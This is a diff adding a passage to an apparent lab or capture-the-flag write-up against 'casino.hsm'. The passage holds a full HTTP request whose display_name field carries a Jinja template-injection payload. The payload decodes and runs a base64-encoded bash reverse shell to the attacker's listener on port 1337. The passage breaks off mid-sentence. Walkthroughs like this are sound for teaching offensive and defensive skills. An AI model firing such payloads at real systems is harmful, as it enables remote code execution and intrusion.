@@ -257,3 +257,27 @@ penelope -p 1337
 
 Ill start a listener
 
+![](Pasted%20image%2020260821171824.png)
+
+Ill grab a payload from revshells 
+
+```python
+POST /profile HTTP/1.1
+Host: casino.hsm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 17
+Origin: http://casino.hsm
+Connection: keep-alive
+Referer: http://casino.hsm/profile
+Cookie: session=.eJxFjk0KgzAQha8is1HBigotxQsUuvUAIZqoQ_MjybgoIXdvtJSu5nsfD94EEOg3xd_McC2hhxAyL9VcM4YGibEEi7IjV_7kcUdFaL4B9WZd6hS59XlZb3aTpshRJHaSi6LMYoQKll16gj7AtMrpZXdigtOx1TXd7dLcL22bWjM6T78vnun4JBX_u0Ejrck5azUzux6lg75trhUQHggDcSO4E9njHIzxAxZmSoI.aoh2RQ.bH4Jm8yeYaZ1azxbMpLL0GZeckA
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+display_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMDAuODMuMjU1LzEzMzcgMD4mMQ== | base64 -d | bash').read() }}
+```
+
+Ill put the base64 encoded payload in, then base64 de
